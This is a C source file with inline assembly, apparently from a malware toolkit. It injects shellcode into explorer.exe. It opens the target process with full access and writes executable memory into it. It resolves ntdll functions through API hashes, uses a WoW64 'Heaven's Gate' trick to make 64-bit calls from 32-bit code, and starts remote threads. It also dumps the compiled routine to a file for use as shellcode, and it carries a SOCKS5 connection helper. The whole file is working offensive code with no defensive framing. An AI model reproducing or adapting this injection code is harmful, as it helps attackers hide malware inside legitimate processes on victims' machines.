#include "shellcodes.h"

#ifndef _WIN64

extern bool __stdcall inject_to_explorer(global_data_t *global_data, wchar_t *process_name, void *thread_main, u32 thread_main_size);
extern HANDLE wow64_create_remote_thread(global_data_t *global_data, HANDLE process, u64 thread, u64 param);
u64 inject_memory(global_data_t *global_data, HANDLE process, unsigned char *buf, u32 size);
extern u64 wow64_inject_memory(global_data_t *global_data, HANDLE process, unsigned char *buf, u32 size);
extern u64 wow64_call(u64 func, int argC, ...);
extern u32 find_process_by_name(global_data_t *global_data);
extern void inject_to_explorer_end();

#define NtAllocateVirtualMemory_Hash  0x7E6E5D9D
#define NtWriteVirtualMemory_Hash     0x79BB568F
#define RtlCreateUserThread_Hash      0x2309A86F

// from wow64ext
#define _RAX  0
#define _RCX  1
#define _RDX  2
#define _RBX  3
#define _RSP  4
#define _RBP  5
#define _RSI  6
#define _RDI  7
#define _R8   8
#define _R9   9
#define _R10 10
#define _R11 11
#define _R12 12
#define _R13 13
#define _R14 14
#define _R15 15

#ifndef STATUS_SUCCESS
#   define STATUS_SUCCESS 0
#endif

#define emit(a) __asm __emit(a)
#define X64_Push(r) emit(0x48 | ((r) >> 3)) emit(0x50 | ((r) & 7))
#define X64_Pop(r) emit(0x48 | ((r) >> 3)) emit(0x58 | ((r) & 7))
#define REX_W emit(0x48) __asm

#define x64_start() \
                                {\
    emit(0x6a) emit(0x33)                       /* push 0x33 */\
    emit(0xe8) emit(0) emit(0) emit(0) emit(0)  /* call $+5 */\
    emit(0x83) emit(0x4) emit(0x24) emit(0x5)   /* add dword [esp], 0x5 */\
    emit(0xcb)                                  /* retf */\
                                }

#define x64_end() \
                                {\
    emit(0xe8) emit(0) emit(0) emit(0) emit(0)                                      /* call $+5 */\
    emit(0xc7) emit(0x44) emit(0x24) emit(0x4) emit(0x23) emit(0) emit(0) emit(0)   /* mov dword [rsp + 4], 0x23 */\
    emit(0x83) emit(0x4) emit(0x24) emit(0xd)                                       /* add dword [rsp], 0xd */\
    emit(0xcb)                                                                      /* retf */\
                                }

typedef union reg64 {
  u64 v;
  u32 dw[2];
} reg64;

#pragma optimize("ts", on)

bool __stdcall inject_to_explorer(global_data_t *global_data, wchar_t *process_name, void *thread_main, u32 thread_main_size) {
  u32 target = global_data->find_process_by_name_x86(global_data, process_name);

  while (target == 0) {
    global_data->xSleep(1000 * 3);
    target = global_data->find_process_by_name_x86(global_data, process_name);
  }

  HANDLE process = global_data->xOpenProcess(PROCESS_ALL_ACCESS, false, target);
  if (process == 0) return false;

  explorer_thread_param_t *remote_thread_param = global_data->alloc_memory(global_data, sizeof(explorer_thread_param_t));

  global_data->xRtlZeroMemory(remote_thread_param, sizeof(explorer_thread_param_t));
  global_data->xRtlMoveMemory(&remote_thread_param->global_data, global_data, sizeof(global_data_t));

  // ÐÞ¸´global_data extracº¯Êý
  extra_function_t *extrac_function = &remote_thread_param->global_data.connect_by_socks5;
  for (u32 i = 0; i < 15; i++) {
    if (extrac_function->ptr64 != 0) {
      extrac_function->ptr64 = inject_memory(global_data, process, (unsigned char *)extrac_function->ptr32, extrac_function->size);
      if (extrac_function->ptr64 == 0) {
        global_data->free_memory(global_data, remote_thread_param);
        return false;
      }
      extrac_function++;
    }
  }

  remote_thread_param->thread_main = inject_memory(global_data, process, (unsigned char *)thread_main, thread_main_size);
  if (remote_thread_param->thread_main == 0) {
    global_data->free_memory(global_data, remote_thread_param);
    return false;
  }
  remote_thread_param->thread_main_size = thread_main_size;

  u64 remote_param = inject_memory(global_data, process, (unsigned char *)remote_thread_param, sizeof(explorer_thread_param_t));
  u64 remote_thread = inject_memory(global_data, process,
    global_data->is_wow64 ? (unsigned char *)global_data->inject_to_explorer_code_x64.ptr32 : (unsigned char *)global_data->inject_to_explorer_code_x86.ptr32,
    global_data->is_wow64 ? global_data->inject_to_explorer_code_x64.size : global_data->inject_to_explorer_code_x86.size);
  if (remote_param == 0 || remote_thread == 0) {
    global_data->free_memory(global_data, remote_thread_param);
    return false;
  }

  HANDLE thread = global_data->is_wow64 ?
    wow64_create_remote_thread(global_data, process, remote_thread, remote_param) :
    global_data->xCreateRemoteThread(process, 0, 0, (LPTHREAD_START_ROUTINE)remote_thread, (void *)remote_param, 0, 0);
  global_data->xCloseHandle(thread);

  global_data->free_memory(global_data, remote_thread_param);
  return thread != 0;
}

u64 inject_memory(global_data_t *global_data, HANDLE process, unsigned char *buf, u32 size) {
  if (global_data->is_wow64) {
    return wow64_inject_memory(global_data, process, buf, size);
  }

  void *remote = global_data->xVirtualAllocEx(process, 0, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  if (remote == 0) return 0;

  u32 writed = 0;
  global_data->xWriteProcessMemory(process, remote, buf, size, &writed);

  return (u64)remote;
}

u64 wow64_inject_memory(global_data_t *global_data, HANDLE process, unsigned char *buf, u32 size) {
  u64 NtAllocateVirtualMemory, NtWriteVirtualMemory, ntdll_base;

  ntdll_base = wow64_call(global_data->get_ntdll_base_x64.ptr64, 0);
  NtAllocateVirtualMemory = wow64_call(global_data->get_proc_from_hash_x64.ptr64, 3, ntdll_base, 
    (u64)NtAllocateVirtualMemory_Hash, (uint64_t)0);
  NtWriteVirtualMemory = wow64_call(global_data->get_proc_from_hash_x64.ptr64, 3, ntdll_base, (u64)NtWriteVirtualMemory_Hash, (uint64_t)0);

  if ((NtAllocateVirtualMemory & NtWriteVirtualMemory) == 0) return 0;

  u64 target_address = 0;
  u64 temp_size = size;
  u64 ret = wow64_call(NtAllocateVirtualMemory, 6, (u64)process, (u64)&target_address, (u64)0, (u64)&temp_size,
    (u64)MEM_TOP_DOWN | MEM_COMMIT, (u64)PAGE_EXECUTE_READWRITE);
  if (ret != STATUS_SUCCESS) return 0;

  u64 writed = 0;
  ret = wow64_call(NtWriteVirtualMemory, 5, (u64)process, target_address, (u64)buf, (u64)size, (u64)&writed);
  if (ret != STATUS_SUCCESS) return 0;

  return target_address;
}

HANDLE __cdecl wow64_create_remote_thread(global_data_t *global_data, HANDLE process, u64 thread, u64 param) {
  u64 RtlCreateUserThread, ntdll_base, ret;

  ntdll_base = wow64_call(global_data->get_ntdll_base_x64.ptr64, 0);
  RtlCreateUserThread = wow64_call(global_data->get_proc_from_hash_x64.ptr64, 3, 
    ntdll_base,
    (u64)RtlCreateUserThread_Hash, 
    (u64)0);
  if (RtlCreateUserThread == 0) return 0;

  u64 thread_handle = 0;
  ret = wow64_call(RtlCreateUserThread, 10,
    (u64)process,
    (u64)0,
    (u64)FALSE,
    (u64)0,
    (u64)0,
    (u64)0,
    thread,
    param,    // param
    (u64)&thread_handle,
    (u64)0);
  if (ret != STATUS_SUCCESS) return 0;

  return (HANDLE)thread_handle;
}

#pragma warning(push)
#pragma warning(disable : 4409)
u64 wow64_call(uint64_t func, int argC, ...) {
  va_list args;
  va_start(args, argC);
  reg64 _rcx = { (argC > 0) ? argC--, va_arg(args, u64) : 0 };
  reg64 _rdx = { (argC > 0) ? argC--, va_arg(args, u64) : 0 };
  reg64 _r8 = { (argC > 0) ? argC--, va_arg(args, u64) : 0 };
  reg64 _r9 = { (argC > 0) ? argC--, va_arg(args, u64) : 0 };
  reg64 _rax = { 0 };

  reg64 restArgs = { (u64)&va_arg(args, u64) };

  // conversion to QWORD for easier use in inline assembly
  reg64 _argC = { (uint64_t)argC };
  uint32_t back_esp = 0;
  uint16_t back_fs = 0;

  __asm
  {
    ;// reset FS segment, to properly handle RFG
    mov    back_fs, fs
      mov    eax, 0x2B
      mov    fs, ax

      ;// keep original esp in back_esp variable
    mov    back_esp, esp

      ;// align esp to 0x10, without aligned stack some syscalls may return errors !
    ;// (actually, for syscalls it is sufficient to align to 8, but SSE opcodes 
    ;// requires 0x10 alignment), it will be further adjusted according to the
    ;// number of arguments above 4
    and    esp, 0xFFFFFFF0

      x64_start();

    ;// below code is compiled as x86 inline asm, but it is executed as x64 code
    ;// that's why it need sometimes REX_W() macro, right column contains detailed
    ;// transcription how it will be interpreted by CPU

    ;// fill first four arguments
    REX_W mov    ecx, _rcx.dw[0];// mov     rcx, qword ptr [_rcx]
    REX_W mov    edx, _rdx.dw[0];// mov     rdx, qword ptr [_rdx]
    push   _r8.v;// push    qword ptr [_r8]
    X64_Pop(_R8);;// pop     r8
    push   _r9.v;// push    qword ptr [_r9]
    X64_Pop(_R9);;// pop     r9
    ;//
    REX_W mov    eax, _argC.dw[0];// mov     rax, qword ptr [_argC]
    ;// 
    ;// final stack adjustment, according to the    ;//
    ;// number of arguments above 4                 ;// 
    test   al, 1;// test    al, 1
    jnz    _no_adjust;// jnz     _no_adjust
    sub    esp, 8;// sub     rsp, 8
  _no_adjust:;//
    ;// 
    push   edi;// push    rdi
    REX_W mov    edi, restArgs.dw[0];// mov     rdi, qword ptr [restArgs]
    ;// 
    ;// put rest of arguments on the stack          ;// 
    REX_W test   eax, eax;// test    rax, rax
    jz     _ls_e;// je      _ls_e
    REX_W lea    edi, dword ptr[edi + 8 * eax - 8];// lea     rdi, [rdi + rax*8 - 8]
    ;// 
  _ls:;// 
    REX_W test   eax, eax;// test    rax, rax
    jz     _ls_e;// je      _ls_e
    push   dword ptr[edi];// push    qword ptr [rdi]
    REX_W sub    edi, 8;// sub     rdi, 8
    REX_W sub    eax, 1;// sub     rax, 1
    jmp    _ls;// jmp     _ls
  _ls_e:;// 
    ;// 
    ;// create stack space for spilling registers   ;// 
    REX_W sub    esp, 0x20;// sub     rsp, 20h
    ;// 
    call   func;// call    qword ptr [func]
    ;// 
    ;// cleanup stack                               ;// 
    REX_W mov    ecx, _argC.dw[0];// mov     rcx, qword ptr [_argC]
    REX_W lea    esp, dword ptr[esp + 8 * ecx + 0x20];// lea     rsp, [rsp + rcx*8 + 20h]
    ;// 
    pop    edi;// pop     rdi
    ;// 
    // set return value                             ;// 
    REX_W mov    _rax.dw[0], eax;// mov     qword ptr [_rax], rax

    x64_end();

    mov    ax, ds
      mov    ss, ax
      mov    esp, back_esp

      ;// restore FS segment
    mov    ax, back_fs
      mov    fs, ax
  }
  return _rax.v;
}
#pragma warning(pop)

void inject_to_explorer_end() {
  printf(__FUNCTION__);
}

#pragma optimize("ts", off)

void inject_to_explorer_save(const char *filename) {
  char *start, *end;
  FILE *f;

  start = (char *)inject_to_explorer;
  end = (char *)inject_to_explorer_end;

  printf("[*] inject_to_explorer code size = 0x%X\n", end - start);

  f = fopen(filename, "wb");

  u16 temp = offsetof(global_data_t, inject_to_explorer);
  printf("offset: 0x%X\n", temp);

  fwrite(&temp, 1, sizeof(temp), f);
  
  temp = end - start;
  fwrite(&temp, 1, sizeof(temp), f);
  
  fwrite(start, 1, end - start, f);

  fclose(f);

  printf("[*] save inject_to_explorer to %s success.\n", filename);
}

#endif